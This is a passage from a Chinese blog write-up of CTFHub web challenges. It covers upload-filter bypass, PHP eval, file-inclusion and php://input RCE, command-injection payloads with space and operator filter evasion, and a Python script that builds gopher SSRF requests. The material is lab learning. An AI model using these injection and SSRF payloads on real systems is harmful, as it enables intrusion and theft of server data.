class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这里将黑名单中的替换为空，和明显可以双写绕过</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222144054449.png" alt="image-20231222144054449"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222144135376.png" alt="image-20231222144135376"></p>
<h2 id="RCE">RCE</h2>
<h3 id="eval-执行">eval()执行</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>没有任何过滤</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222144329592.png" alt="image-20231222144329592"></p>
<p>最后cat读取即可</p>
<h3 id="文件包含">文件包含</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker!!!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span>
i have a <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shell.txt<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>shell<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>, how to use it ?
i have a shell, how to use it ?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里限制了flag的出现，strpos是用于寻找file参数中是否存在flag敏感字符。</p>
<p>那我们传入一句话即可，这里用他提供的shell.txt了，因为include会执行传入的文件中的php代码</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222144917742.png" alt="image-20231222144917742"></p>
<p>最后读取即可</p>
<h3 id="php-input">php://input</h3>
<p>使用题目描述的php伪协议的前提就是，下面的include那个参数为on</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222145527575.png" alt="image-20231222145527575"></p>
<p>接着我们构造payload即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222145640981.png" alt="image-20231222145640981"></p>
<h3 id="远程包含">远程包含</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker!!!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span>
i don't have shell, how to get flag?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phpinfo.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>phpinfo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
i don't have shell, how to get flag?
phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222145935363.png" alt="image-20231222145935363"></p>
<p>我们看到值为on可以进行远程文件包含，我们直接将其包含我们vps上的恶意文件即可注意恶意文件的后缀不可为php</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222150603576.png" alt="image-20231222150603576"></p>
<p>或者采用上一关的php://input也可</p>
<h3 id="读取源代码">读取源代码</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222151109422.png" alt="image-20231222151109422"></p>
<p>直接php伪协议读取即可</p>
<h3 id="命令注入">命令注入</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 4 <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">;</span>
    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token operator">|</span><span class="token function">ls</span>
<span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token operator">|</span><span class="token function">cat</span> <span class="token number">3475247317307</span>.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222151739546.png" alt="image-20231222151739546"></p>
<h3 id="过滤cat">过滤cat</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?ip<span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token operator">|</span><span class="token function">tac</span> flag_232592471929828.php<span class="token operator">|</span>base64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222152026089.png" alt="image-20231222152026089"></p>
<p>解密即可</p>
<h3 id="过滤空格-2">过滤空格</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">|</span><span class="token class-name">tac</span><span class="token variable">$</span><span class="token punctuation">{</span><span class="token constant">IFS</span><span class="token punctuation">}</span>flag_15920651517426<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222152236877.png" alt="image-20231222152236877"></p>
<pre class="line-numbers language-none"><code class="language-none">&lt; 、&lt;&gt;、%20(space)、%09(tab)、\$IFS\$9、 \${IFS}、$IFS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="过滤目录分隔符">过滤目录分隔符</h3>
<p>这里看到题目过滤了<code>/</code>符号，陷入知识盲区了，想着编码可以绕过，但没有效果，不知道为何。看了wp发现似乎是考察对于管道符的理解的，我们可以采用;符号</p>
<p>;ls发现flag所在目录</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222154059410.png" alt="image-20231222154059410"></p>
<p>那接下来我们这样构造</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?ip<span class="token operator">=</span><span class="token punctuation">;</span><span class="token builtin class-name">cd</span> flag_is_here<span class="token punctuation">;</span><span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222154113594.png" alt="image-20231222154113594"></p>
<p>cat读取即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222154140256.png" alt="image-20231222154140256"></p>
<h3 id="过滤运算符">过滤运算符</h3>
<p>这里看代码过滤了&amp;和/符号，我们直接用;即可</p>
<p><code>?ip=;cat flag_146781707832397.php</code></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222154840357.png" alt="image-20231222154840357"></p>
<h3 id="综合过滤练习">综合过滤练习</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 4 <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$ip</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">;</span>
        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里过滤了|、&amp;、;、\、cat、flag、ctfhub，这里可以采用%0a换行符或者%09Tab制表符绕过</p>
<p><strong>在 Linux 中使用 Tab 键，可以实现命令补全、文件和目录名补全等。</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?ip<span class="token operator">=</span>%0acd%09*here%0atac<span class="token variable">${<span class="token environment constant">IFS</span>}</span>fla<span class="token string">''</span>g_61041444712473.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222160446048.png" alt="image-20231222160446048"></p>
<h2 id="SSRF">SSRF</h2>
<h3 id="内网访问">内网访问</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222161315946.png" alt="image-20231222161315946"></p>
<p>这里直接按照如上访问即可得到</p>
<h3 id="伪协议读取文件">伪协议读取文件</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222161449988.png" alt="image-20231222161449988"></p>
<p>采用file伪协议直接读取到</p>
<h3 id="端口扫描">端口扫描</h3>
<p>这里说是端口扫描且范围在8000-9000，那我们利用dict或者http协议即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222162419632.png" alt="image-20231222162419632"></p>
<p>我们构造如上payload对8000位置进行爆破即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222162442551.png" alt="image-20231222162442551"></p>
<p>共计完成后发现一个长度明显不同的</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222162505132.png" alt="image-20231222162505132"></p>
<p>最后利用http协议访问该端口发现flag</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222162521166.png" alt="image-20231222162521166"></p>
<h3 id="POST请求">POST请求</h3>
<p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p>
<p>这题又是我的知识盲区，就跟着wp走了，思路如下。</p>
<p>一般遇到这种漏洞我们需要先利用简单的file、http、dict协议进行初步的判断，比如端口开放情况，其内网文件那些可读等等。那这里我们就先看看能否读取到127.0.0.1里面的文件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>url<span class="token operator">=</span>file<span class="token punctuation">:</span><span class="token comment">///var/www/html/index.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>再读flag.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just View From 127.0.0.1"</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"CTFHUB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- Debug: key=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里说地址只能为127.0.0.1且如果我们传入正确的key即可获得flag（但必须是post传入key），并且提示我们访问flag.php即可得到key，如下图：<code>key=fd2d96bb2014fc2e6989fca7ece45856</code></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222163823929.png" alt="image-20231222163823929"></p>
<p>接下来就应该想着谁可以进行post传参，这里看了wp知道是gopher协议可以</p>
<pre class="line-numbers language-none"><code class="language-none">gopher伪协议（curl支持gopher），发送GET或POST请求(需要配合http协议二次url编码上传)；
本题要用gopher发送POST请求，gopher的格式是gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接tcp流，本题默认伪gopher://127.0.0.1:80/_后接post请求 ，完整的gopher请求如下：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/flag.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:80</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">36</span></span>
 
key=fd2d96bb2014fc2e6989fca7ece45856<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>具体原理一会儿再说，然后我们将它进行url编码，进行编码时要注意：</p>
<blockquote>
<ol>
<li>问号（？）需要转码为URL编码，也就是%3f(本题不涉及这个问题)</li>
<li>回车换行要变为%0d%0a，但如果直接用工具转，可能只会有%0a</li>
<li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li>
</ol>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=b8241a456e991e16ea69f441fd0cb214
"""</span>

<span class="token comment"># 注意payload的最后一行是回车（空行），表示http请求结束</span>
tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span> <span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>
new2 <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>new<span class="token punctuation">)</span>
result <span class="token operator">=</span> <span class="token string">'gopher://127.0.0.1:80/_'</span> <span class="token operator">+</span> new2
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>  <span class="token comment"># 这里因为是GET请求所以要进行两次url编码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>之后bp发送即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222170512279.png" alt="image-20231222170512279"></p>
<p>这里在复现的时候遇到的问题也很多，在此梳理一下</p>
<p>第一个是关于gopher协议编码几次的问题：</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222194054670.png" alt="image-20231222194054670"></p>
<p>这里好理解一点就是：比如我们想要利用gopher协议攻击一个服务器的内网，并且该服务器某处存在一个ssrf的漏洞，那我们肯定要在此处传入我们的gopher协议进行打击，但在此之前呢，该web端对于我们传入的参数（也就是gopher协议的内容）进行了多次请求（或者叫做处理），但这些请求对我们来说是多余不必要的，我们想要的是最后一次可以达到对内网服务的请求。</p>
<p>但再次之前服务器对该参数内容进行了多次处理：url解码，这可能会导致我们在最终攻击之前，其gopher协议里面的部分参数被解析为无效的字符之类的导致我们的攻击失败，因此我们需要进行足够次数的url编码，让其保证在最后一次对内网服务请求的时候在对我们的gopher内容进行最后一次url解码。–如果理解有误，勿喷~~</p>
<p>那接下来让我们回顾一下上述代码，分析一下需要进行几次编码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
